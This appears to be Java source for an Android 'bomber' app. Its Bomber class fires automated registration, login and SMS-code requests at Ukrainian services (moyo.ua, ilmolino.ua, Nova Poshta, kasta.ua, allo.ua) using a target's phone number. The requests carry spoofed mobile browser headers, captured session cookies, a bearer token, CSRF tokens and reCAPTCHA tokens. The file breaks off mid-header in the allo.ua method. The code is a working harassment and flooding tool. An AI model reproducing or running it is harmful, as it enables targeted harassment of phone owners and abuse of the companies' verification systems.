package com.example.pythonbomber.attack;

import android.app.Activity;
import android.content.Context;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Bomber {
    private Context context;

    public Bomber(Context context) {
        this.context = context;
    }

    public void data(String url, String params, OkHttpClient client) {
        int v = (int) (Math.random() * 1000);

        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody requestBody = RequestBody.create(mediaType, params);
        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                System.out.println(response.body().string());
            }
        });
    }

    public void json(String url, String key, String param, OkHttpClient client) throws JSONException {
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(key, param);

        String jsonString = jsonObject.toString();
        RequestBody requestBody = RequestBody.create(mediaType, jsonString);

        Request request = new Request.Builder().url(url).post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                System.out.println("ok");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                ((Activity) context).runOnUiThread(new Runnable() {
                    @Override
                    public void run() {

                    }
                });
            }
        });
    }

    public void customJson(String url, String params, OkHttpClient client) throws JSONException {
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");

        String jsonString = params;
        RequestBody requestBody = RequestBody.create(mediaType, jsonString);

        Request request = new Request.Builder().url(url).post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                ((Activity) context).runOnUiThread(new Runnable() {
                    @Override
                    public void run() {

                    }
                });
            }
        });
    }

    public void jsonCookies(String url, String params, OkHttpClient client) throws JSONException {
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");

        String jsonString = params;
        RequestBody requestBody = RequestBody.create(mediaType, jsonString);

        Request request = new Request.Builder()
                .url(url)
                .addHeader("Cookie", "_gcl_au=1.1.996724664.1686810227; _gid=GA1.2.2033319295.1686810227; session_id_crossdomain=undefined; _fbp=fb.1.1686810227800.1763106061; _tt_enable_cookie=1; _ttp=r5wQp9Gt9PWWSs1IEFcuqK7AW4K; __zlcmid=1GNltit3wTi3AGm; sc=8DBDAB33-5FCA-5D76-68B4-C6B8B7607391; _ga_ZLYLWW79BK=GS1.1.1686810238.1.1.1686810304.0.0.0; _hjFirstSeen=1; _hjSession_1332871=eyJpZCI6ImRjMTI4NDMwLWQxNmItNDIzOC1hNTY4LWViZmU2MzgwMjBhOSIsImNyZWF0ZWQiOjE2ODY4MTAzMDkzMTIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_FFQG3CY8S4=GS1.1.1686810308.1.0.1686810537.0.0.0; _ga_388KF4ZHNJ=GS1.1.1686810309.1.0.1686810537.60.0.0; _ga_XC0THXYVR3=GS1.1.1686810535.1.1.1686810639.0.0.0; _ga_CNH7575R0H=GS1.1.1686810641.1.0.1686810644.0.0.0; _ga_EDTECG6E37=GS1.1.1686810648.1.0.1686810740.0.0.0; _ga_60Y668NPMF=GS1.1.1686810784.1.0.1686810790.0.0.0; _hjSessionUser_1332871=eyJpZCI6IjIxM2MyM2I3LTIxNGQtNWRiZC1hNmNhLWYwYjFhZGNlNDRiMyIsImNyZWF0ZWQiOjE2ODY4MTAzMDkyOTYsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_1332871=0; _ga_JNLVF192Z4=GS1.1.1686810227.1.1.1686811345.15.0.0; _ga=GA1.2.728142105.1686810227; _gat_UA-122495531-29=1; _gat_UA-127940954-1=1; _ga_CPK07BFZ9F=GS1.1.1686810227.1.1.1686811373.59.0.0; _ga_R9ZMJKGRXN=GS1.1.1686811301.1.1.1686811389.0.0.0")
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                ((Activity) context).runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            System.out.printf(response.body().string());
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        });
    }

    // SERVISES WITH COOKIES
    public void moyo(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody1 = new FormBody.Builder()
                .add("firstname", "Катерина")
                .add("phone", num)
                .add("email", "cnskjd" + num + "u@gmail.com")
                .build();

        Request request = new Request.Builder()
                .url("https://www.moyo.ua/identity/registration")
                .post(requestBody1)
                .header("authority", "www.moyo.ua")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-form-data", "251b2615b913e59efbd8165f4530a630")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "rds_mobile=2DyPh5KkZb; basket=1872f035524824921c4f988bb8c22777; basket_summary_products=0; basket_summary_money=0; init_source_page_type=main_page; _gcl_aw=GCL.1684066198.CjwKCAjwjYKjBhB5EiwAiFdSfr1lFtjuHZqvw-rXw0zd1jOCh7JNzsmjONmcdtL7HMAHJcCYYkK1sRoCLDAQAvD_BwE; _gcl_au=1.1.1536960486.1684066198; source=sourceCookie|utm_source; init_source_page=https%3A%2F%2Fwww.moyo.ua%2Fua%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc%26utm_campaign%3DMoyo_Konkurenty_%2528melkiye%2529_Search%26gclid%3DCjwKCAjwjYKjBhB5EiwAiFdSfr1lFtjuHZqvw-rXw0zd1jOCh7JNzsmjONmcdtL7HMAHJcCYYkK1sRoCLDAQAvD_BwE; sc=3A5F0FBF-95C4-FE93-26DB-BCED258ACDB2; _gac_UA-16250353-8=1.1684066199.CjwKCAjwjYKjBhB5EiwAiFdSfr1lFtjuHZqvw-rXw0zd1jOCh7JNzsmjONmcdtL7HMAHJcCYYkK1sRoCLDAQAvD_BwE; _omappvp=obQYMbIRh5LbUZdNpBsZPJ2NnkkTvxcXwN5U6id4iMQvc38JLoGHFPoCfJTIaY3H9MdmF5rlrnvFXuXb4ZSN8xozCt8u85eA; _fbp=fb.1.1684066200765.1767495344; _gac_UA-16250353-2=1.1684066201.CjwKCAjwjYKjBhB5EiwAiFdSfr1lFtjuHZqvw-rXw0zd1jOCh7JNzsmjONmcdtL7HMAHJcCYYkK1sRoCLDAQAvD_BwE; lang=ru; rds=2DyPh5KkZb; _hjSessionUser_1850514=eyJpZCI6ImFkZWQ2MGZmLTRjYmQtNTYzZS1iYTUyLWY3ZWM2NGNkMWRhOCIsImNyZWF0ZWQiOjE2ODQwNjYxOTkxODcsImV4aXN0aW5nIjp0cnVlfQ==; PHPSESSID=o7c8qu6p87t6o3k6epgo5o5iq3; cityActiveId=3371; dl_meta=%7B%22auth_cid%22%3A%221165256202.1684066199%22%7D; 8958e7921a1092752da2ad53959ef644=37a7c5a0a5830258df4e81455b413774; _hjIncludedInSessionSample_1850514=0; _hjSession_1850514=eyJpZCI6ImRkM2QxYTdhLTk0NDAtNDQxZS04OTY0LTA1OWI0ZjUwY2VlMiIsImNyZWF0ZWQiOjE2OTExMzgwNjQ5MDUsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; YII_CSRF_TOKEN=dbbc373fee97e7be3b49b218a529ee73ca937709; _gid=GA1.2.2049921379.1691138066; __utma=46025016.1165256202.1684066199.1686769093.1691138066.3; __utmc=46025016; __utmz=46025016.1691138066.3.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt_UA-16250353-8=1; __utmb=46025016.1.10.1691138066; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22undefined%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22VRNjpP3nzsVL63M3mM5Y%22%7D; __user_id=uid-5971719378.0689661925; viewed_popupbanners=[864]; _dc_gtm_UA-16250353-2=1; _ga=GA1.2.1165256202.1684066199; biatv-cookie={%22firstVisitAt%22:1684066197%2C%22visitsCount%22:3%2C%22campaignCount%22:3%2C%22currentVisitStartedAt%22:1691138067%2C%22currentVisitLandingPage%22:%22https://www.moyo.ua/%22%2C%22currentVisitOpenPages%22:1%2C%22location%22:%22https://www.moyo.ua/%22%2C%22locationTitle%22:%22%D0%98%D0%BD%D1%82%D0%B5%D1%80%D0%BD%D0%B5%D1%82-%D0%BC%D0%B0%D0%B3%D0%B0%D0%B7%D0%B8%D0%BD%20Moyo.ua%20-%20%D0%BC%D0%B0%D0%B3%D0%B0%D0%B7%D0%B8%D0%BD%20%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D0%B8%2C%20%D1%8D%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D0%BD%D0%B8%D0%BA%D0%B8%2C%20%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%2C%20%D0%B3%D0%B0%D0%B4%D0%B6%D0%B5%D1%82%D0%BE%D0%B2%20%D0%B2%20%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B5%20|%20%D0%9A%D0%B8%D0%B5%D0%B2%2C%20%D0%9B%D1%8C%D0%B2%D0%BE%D0%B2%2C%20%D0%A5%D0%B0%D1%80%D1%8C%D0%BA%D0%BE%D0%B2%2C%20%D0%9E%D0%B4%D0%B5%D1%81%D1%81%D0%B0%2C%20%D0%97%D0%B0%D0%BF%D0%BE%D1%80%D0%BE%D0%B6%D1%8C%D0%B5%2C%20%D0%A7%D0%B5%D1%80%D0%BA%D0%B0%D1%81%D1%81%D1%8B%22%2C%22userAgent%22:%22Mozilla/5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/114.0.0.0%20Safari/537.36%22%2C%22language%22:%22ru-ru%22%2C%22encoding%22:%22utf-8%22%2C%22screenResolution%22:%221280x720%22%2C%22currentVisitUpdatedAt%22:1691138067%2C%22utmDataCurrent%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22organic%22%2C%22utm_campaign%22:%22(not%20set)%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20provided)%22%2C%22beginning_at%22:1691138067}%2C%22campaignTime%22:1691138067%2C%22utmDataFirst%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22cpc%22%2C%22utm_campaign%22:%22Moyo_Konkurenty_(melkiye)_Search%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20set)%22%2C%22beginning_at%22:1684066197}%2C%22utmDataFirstPaid%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22cpc%22%2C%22utm_campaign%22:%22Moyo_Konkurenty_(melkiye)_Search%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20set)%22%2C%22beginning_at%22:1684066197}%2C%22utmDataLastPaid%22:{%22utm_source%22:%22google%22%2C%22utm_medium%22:%22cpc%22%2C%22utm_campaign%22:%22Moyo_Konkurenty_(melkiye)_Search%22%2C%22utm_content%22:%22(not%20set)%22%2C%22utm_term%22:%22(not%20set)%22%2C%22beginning_at%22:1684066197}%2C%22geoipData%22:{%22country%22:%22Ukraine%22%2C%22region%22:%22Transcarpathia%22%2C%22city%22:%22Rakhiv%22%2C%22org%22:%22%22}}; _clck=1saz7rt|2|fdv|0|1229; _clsk=mny91l|1691138069710|1|1|q.clarity.ms/collect; _ga_2YP56NYVCH=GS1.1.1691138066.3.1.1691138080.46.0.0; isContextQuery=0; new_user_ga=0; no_detected_user_ga=0; publicKey=810e0e0ef8e530fd2636943103170cc9")
                .header("origin", "https://www.moyo.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://www.moyo.ua/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    System.out.println(response.body().string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void ilmolino(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("phone", num.substring(2))
                .add("need_skeep", "")
                .build();

        Request request = new Request.Builder()
                .url("https://ilmolino.ua/api/v1/user/auth")
                .post(formBody)
                .header("authority", "ilmolino.ua")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("authorization", "Bearer eyJpdiI6IlpUVmpNalU1TmpnMVpHRTVOekl6Wmc9PSIsImRhdGEiOiJcL0JxSW5EUWVlZ0xkeENXT0Z5YTJuc1lYcUtsOVBzUVZOK3ZoYW1hUHp3ST0ifQ==")
                .header("cache-control", "no-cache")
                .header("content-type", "application/x-www-form-urlencoded")
                .header("cookie", "_fbp=fb.1.1688923663372.372499158; 5c56ddacb7d52afbab2130776ac59994=igc5rscg43cmlrfjpvkh37vib6; _ga_FL1BQBMJX7=GS1.1.1691139904.1.0.1691139904.60.0.0; _gid=GA1.2.105336100.1691139905; _gat_gtag_UA_200520041_1=1; _dc_gtm_UA-200520041-1=1; _ga=GA1.1.829275136.1691139905; _ga_L50KYP048R=GS1.1.1691139905.1.0.1691139912.53.0.0")
                .header("origin", "https://ilmolino.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://ilmolino.ua/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void novaposhta(String num) {
        OkHttpClient client = new OkHttpClient();

        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        String requestBody = "{\"language\":\"uk\",\"username\":\"380637849759\",\"otptype\":\"sms\",\"challenge\":\"4ea80ac97b5f4515b3358fe8b87486be\",\"otpsend\":false,\"token\":\"03ADUVZwBQ8LAfu53WjALnO5KGnj3Y0BVKuF5OeaSQVOnBVlvw9NN6vUurpUxgeaw1MlhaSBpm5iMgfxNkWfI6prREjKr3aUEcU7-6OeZUZ4xVg0zMufyM1gc5PekPvskBHa-2c-DMb7ei3vlzol2Uzl86eJjdEplEJ7LvWa7cY5B9E0UjutMtE159noLlA1x5MAplz1TPZYP8WCNhHH1BV_4_nk2D7UCH2EYdYXtei2rnfW5QreSVzvcUBPM6YAg4OLZDQsddE18EPi4ZM-FRVBMnoYCYOAwsflLQAw76tlbKt4JxCPJLjzcX6GR30yKVlpkeTQqGBTgesSEJwg5WmGVQ44yDLfHZ-Aa9411lOdsjNzU_YG_qSSu5kikZ1Nb7RClZRQZB0eyz8bztY934YLiFpqNSresrGVNEduC_b-NjJ-UdHRLn_dQUtVMy3yylJf4DsxZHtbrMlA-F-NNhePwSMg76OH5_pQt0U2cUfmzhO-0q0lkxMBz2a7nl-hDzNa0Aeuonnj7aeyc4HvK0zIbGp4Rt6i9AoWlNHZk4FaKOxStRTqT2b_UREia7FKFHcrasgxLkwi67-_Lqaiz9pCqE9W5tXstLuexn2B6tK0PAEjTtwAwnr-eDL8Nte3L6_YW1kUDgOPwGrWQaJDnvIoHdNEdGXvcUVDwB0lt859juj40wd1-z5rxhXLHVne7N8lekWKPSMTXdAKk7GMty5z6uUR33ww2HamhYukESGQ_YleJA21mV8JzfUy5-_tCpPtPRdfZwQJk1wBRy411odnotC2Oq8w636H83MI7ZFl37-lUbuhheikXCW6oNcJsVBTv_6ltIJphY1l8BOfqRBKtFLwzmUot5_-0F93uELzlXw2Q31ACctEiPeu9zbm5JTN0y78XX-okYqSIKeBMcIrBXAz1WQPXnL0jYjKMXJWq4sbyWkV5xLPJX0m7o-rhbhcSnaxVmabMs9BwW7ghfNGpQqq7KMYzXoTtlkssScqzD6ZdYzmFvz2WVBFdvAV7z5TAwmGlZsxFUNY_c2Dq2XCXNO5kHHy6SsHBEkJzi5BfoREahnkfzdF1vi9dp9Z07gro2OV0huRSYbJMsIP4UjJX4VRq5VOlD1wA671HTpQsvtaXWWCNjQvyDJYOISt7T7Yim23fFdnkKdeBmspjKXi74yn2T1ShL4mXkEEQTY_2jDqH7CiywjU80bxMrshAlcwsBpomEz-sgAYa4D2_LVQqmulX5QF6QtSCXWte-MD6RE1HiUNxBby1txKhDYSAB65MTsq7XGVOaaTQ2ql_uH3_wbIHBpPTgvJfbre4cGDBmrdunlI_g0fa_TLWEKcfD5MYbTw-fkoVrdoXb1osFj3bkqe8STs0jJbq-ZP9oxc8I5X4O0Ck28PPt6aXg2ZapRiGJnpSfTEA0RTFFEQRUUgiUH-HmNAwnaSU1u-Klv9bkc6adLr7qXJwL4T3c1fRk1m80KreaXQ_CMUyIuMW9__WRq0nNSAD0U9EPgLxIHs5OkM8-223itkEStsgDhkD2f0YAhcH6g3pEE7snA_XqPKarHo40Zjj1myFQap8s75U02DuobDHZwz1oXSuTmnWUlqz4jha8YYarO5trKhTKvQppTlgXZGcHFoE7wlppY_v-EQcFQOmK3g5d-1-uAZHA5EFbOpGbP10bDFpWTdZ2KiBXLvzF5ZlXEShABw7Vx2bGSVolijQWr0A6Oey8aLIDbIhDowfMj__Iml9pTdS3MNhT3I0o5w0WcYPJA9HGwfdIdYFpwHM6DmurGhUL6YXtgtmYYI8t-Hy-\"}";

        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://id.novaposhta.ua/registration/v2/phone")
                .post(requestBody1)
                .header("authority", "id.novaposhta.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "uk")
                .header("cache-control", "no-cache")
                .header("content-type", "application/json")
                .header("cookie", "origin_ip=193.30.245.6; _gcl_au=1.1.1826417950.1691140348; _fbp=fb.1.1691140348226.1908643470; _gid=GA1.2.157818296.1691140349; _hjSessionUser_2680911=eyJpZCI6ImU4MjkyYTRkLWNlMzQtNTJjZS1hNjBiLTdkZjgwODQ2MmM0MSIsImNyZWF0ZWQiOjE2OTExNDAzNDkyMjgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2680911=0; _hjSession_2680911=eyJpZCI6Ijc2YWQ3MDcxLWI3ZGYtNGNkZS04NzU5LTIxMzhiOTQ4NmMzZSIsImNyZWF0ZWQiOjE2OTExNDAzNDkyNDAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_LY4PWEL7C9=GS1.1.1691140351.1.0.1691140353.58.0.0; _ga_LKGX673EL8=GS1.1.1691140348.1.0.1691140357.51.0.0; _hjSessionUser_2719039=eyJpZCI6IjUwZDIxNzQ5LTNmNDEtNTliNS1hMjE2LTNlMmFlZTVjYzVmMCIsImNyZWF0ZWQiOjE2OTExNDAzNTc2NjEsImV4aXN0aW5nIjpmYWxzZX0=; _hjIncludedInSessionSample_2719039=0; _hjSession_2719039=eyJpZCI6IjJhZTk2MmQyLTI5NDctNGJmZC04Y2ZhLTM2NThkNTFmMTZiZSIsImNyZWF0ZWQiOjE2OTExNDAzNTc2NjUsImluU2FtcGxlIjpmYWxzZX0=; _ga_VQMPHEEJTH=GS1.1.1691140357.1.1.1691140370.47.0.0; _ga_C5JD2YWCLX=GS1.2.1691140358.1.1.1691140370.48.0.0; _ga_TH7GD2FJ3Q=GS1.2.1691140357.1.1.1691140370.47.0.0; oauth2_app_csrf=MTY5MTE0MDM3MXxJbEpIVEhsRGEwcEVTeTh5TWtscWNXVXhXbEpvVlZGbk5XeEliSFI2V1hoT1JWWXhhVEJtYW5GWWVEZzlJZ289fJSPluAlSlzVbEETqzrWPWU2Hp_EgSYpBc7re1PFd9eP; _ga=GA1.1.775566691.1691140349; _ga_07NNX3VW4D=GS1.1.1691140371.1.1.1691140426.5.0.0")
                .header("origin", "https://id.novaposhta.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://id.novaposhta.ua/registration/enterOtp")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-csrf-token", "I0Ny34sNqx2DoFK4CEnnpeLd6q2hML9zHryGo/cKPaNnIYDVyU6A4DWCaCbd3Yb06uR+1Mz9Mz4P4eRyD+BivA==")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void kasta(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("layout", "poe")
                .add("email", num)
                .add("g-recaptcha-response", "03ADUVZwDFDVoD7WP1tJdHGEDayW1klN1hhFJi338xdEzj_BPt0qmPu5sDLARYuAXqv7Ej3OYPoF0ezYniJKcIwqFLn2uWTD1YB0f6hn_PF1SNqfrftyCvJAEEytnn-jZBFebOpjNs_TGjRsrJGKciWD1BcfIpKerB5qEjL7WeJMGVrzpFHugwf2kaH-5DtjvrHqQ83j_OF69moEMXNm0Ys1OtooNUAX0NcmVoYvRxo7zq4zTtKnumonE306yrxNbn3oQ29O-sj7yo6bimPQtb4TZ5mbuN5fcOw7lKRwpXbyVQSFNQzopT2crFw3kf83xaDRiukBVyzpW0wUH1Xaag4PNZeYF2P6bZPEaXkhqrE2bHIFkbC81PGxZbdXp8z5pZ9eTxcZLSzUz88e51KyLcEwsqSbtwAdA56RB0IjIfiOPS5tNPNVgt9syRCy_sttVcjWgT1bJCsNESU14ZfqBSaktMi3sZa8pqOs9RHhq9Nbbv5QMm-pxC1QLn37c5pu21wyWCciKJPOQP1tJIkRgWi5Sf2ojMExh9It1uRssFNaOGlKpyhRDZndI")
                .build();

        Request request = new Request.Builder()
                .url("https://kasta.ua/api/v2/ssr/login-form")
                .post(formBody)
                .header("authority", "kasta.ua")
                .header("accept", "text/html+partial")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/x-www-form-urlencoded")
                .header("cookie", "kcid=yCBK_ywFof; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2023-06-15%2009%3A58%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fkasta.ua%2Fuk%2Fmarket%2Fprodukty-pitaniya-napitki%2F%3Futm_campaign%3D181229_dsa_new_audience_cpc_main_campaign-dsa_new-audience_new-buyers_ukraine%26utm_medium%3Dcpc%26utm_source%3Dgoogle%26utm_term%3D%26gclid%3DCjwKCAjwyqWkBhBMEiwAp2yUFkmCAy4PEJt99tPp11pniJpqATU7uncBlf5UaS5u5122v1LNRdAAKxoC5A4QAvD_BwE%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first=typ%3Dutm%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dcpc%7C%7C%7Ccmp%3D181229_dsa_new_audience_cpc_main_campaign-dsa_new-audience_new-buyers_ukraine%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D; k_last_source=google; firebase_ga=GA1.1.597191015.1686812307; _ga=GA1.2.597191015.1686812307; _gac_UA-17567430-1=1.1686812307.CjwKCAjwyqWkBhBMEiwAp2yUFkmCAy4PEJt99tPp11pniJpqATU7uncBlf5UaS5u5122v1LNRdAAKxoC5A4QAvD_BwE; _tt_enable_cookie=1; _ttp=iyYYStv6dXi12wDBGgjotZqbiak; _fbp=fb.1.1686812308370.86737529; sbjs_current_add=fd%3D2023-08-04%2018%3A29%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fkasta.ua%2Fmarket%2Ftovary-dlya-doma%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F114.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fkasta.ua%2Fmarket%2Ftovary-dlya-doma%2F; _gid=GA1.2.545941614.1691162950; _dc_gtm_UA-17567430-1=1; firebase_ga_1Z132N00BH=GS1.1.1691162950.2.0.1691162956.54.0.0; chua_session=[\"mB_8FmYIxS1\",1691162978868]")
                .header("origin", "https://kasta.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://kasta.ua/market/tovary-dlya-doma/")
                .header("sec-ch-ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("ts-origin", "loginForm")
                .header("ts-target", "popup-container")
                .header("ts-url", "/market/tovary-dlya-doma/")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
                .header("x-lang", "ru")
                .build();

        new Thread(new Runnable() {

            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void allo(String num) {
        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("telephone", num.substring(2))
                .add("form_key", "ELC12REeyw93Y9ZU")
                .build();

        Request request = new Request.Builder()
                .url("https://allo.ua/ru/customer/account/sendLoginVerificationCode/?isAjax=1&currentLocale=ru_RU")
                .post(formBody)
                .header("authority", "allo.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/x-www-form-urlencoded")
                .header("cookie", "__exponea_etc__=03ba76fc-a59f-46b2-8550-fd30da51c360; __uzma=a450fc29-c2f9-4ec9-a821-42c12851ffe0; __uzmb=1686812360; __uzme=0857; is_bot=0; __ssds=2; _fbp=fb.1.1686812364741.2097052597; __ssuzjsr2=a9be0cd8e; __uzmaj2=e8e8ac13-7412-4134-b790-007d024ba398; __uzmbj2=1686812364; _gcl_au=1.1.36942150.1686812365; _tt_enable_cookie=1; _ttp=M_mHjLU-R9G1LyyGVdrkxYkm-U0; city_id=4; __uzmc=605282545203; __uzmd=1686812390; frontend=3096e4ae6db14db182f3018a025921b6; detect_mobile_type=0; __utma=45757819.783591718.1686812365.1686812365.1691163181.2; __utmc=45757819; __utmz=45757819.1691163181.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=45757819.1.10.1691163181; __uzmcj2=897541327682; __uzmdj2=1691163181; _gid=GA1.2.600795077.1691163239; _dc_gtm_UA-63509214-3=1; __exponea_time2__=-13.863930940628052; _ga=GA1.2.783591718.1686812365; _dc_gtm_UA-63509214-1=1; _gat=1; frontend_hash=oWqS3Q3096e4ae6db14db182f3018a025921b6aKq3rv; _gat_UA-63509214-1=1; __insp_wid=1964961402; 